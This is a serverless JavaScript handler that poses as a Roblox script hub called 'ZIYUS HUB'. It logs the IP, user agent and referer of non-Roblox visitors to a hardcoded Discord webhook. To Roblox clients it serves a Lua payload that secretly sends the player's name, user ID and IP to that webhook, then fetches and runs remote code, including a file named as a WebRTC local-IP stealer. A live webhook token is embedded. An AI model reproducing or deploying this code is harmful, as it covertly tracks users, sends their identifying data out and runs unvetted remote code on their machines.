export default async function handler(req, res) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  const realIp = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
                 req.headers['x-real-ip'] ||
                 req.headers['cf-connecting-ip'] ||
                 req.headers['x-vercel-forwarded-for'] ||
                 req.socket.remoteAddress || 'Unknown';
  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers['referer'] || 'Direct';
  const WEBHOOK = 'https://discord.com/api/webhooks/1444992746854289408/xElRiKCryMi--rjyZeQYnF4fozUJmW4-pRYpPZ-5cgD4BmrRlr7LTH-aoxrm07VQL2nz';

  const isRoblox = /Roblox|RobloxStudio/i.test(userAgent);
  const isBot = /curl|wget|fetch|python|axios|postman|got|http|bot/i.test(userAgent) || userAgent.length < 50;

  if (!isRoblox || isBot) {
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: isRoblox ? "Fake Roblox UA" : "Skidder Blocked",
          color: 16711680,
          fields: [
            { name: "IP", value: realIp },
            { name: "User-Agent", value: userAgent.slice(0,1000) },
            { name: "Referer", value: referer }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    }).catch(() => {});

    return res.status(200).send(isRoblox ? "ANO I-FEFETCH MOPA? BOBOKA" : "SKIDDER DETECTED - IP LOGGED");
  }

  const payload = `-- ZIYUS HUB
spawn(function()
    local plr = game.Players.LocalPlayer
    if plr then
        pcall(function()
            local req = (syn and syn.request) or (http and http.request) or request or http_request
            if req then
                req({
                    Url = "${WEBHOOK}",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = game:GetService("HttpService"):JSONEncode({
                        embeds = {{
                            title = "Script Executed",
                            color = 65280,
                            fields = {
                                {name = "Name", value = plr.Name},
                                {name = "UserID", value = tostring(plr.UserId)},
                                {name = "IP", value = "${realIp}"},
                                {name = "User-Agent", value = "${userAgent.replace(/"/g, '\\"').slice(0,500)}"}
                            },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }}
                    })
                })
            end
        end)
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Secret-Employee-Hub/SCRIPT-KIDDIE/refs/heads/main/noskidding"))()

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/public/main/ip-loggers/webrtc-localip-stealer.lua"))()
end)`;

  fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: "EXECUTED",
        color: 65311,
        fields: [{ name: "IP", value: realIp }],
        timestamp: new Date().toISOString()
      }]
    })
  }).catch(() => {});

  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Cache-Control', 'no-store');
  res.status(200).send(payload);
}

export const config = {
  api: {
    bodyParser: false,
  },
};
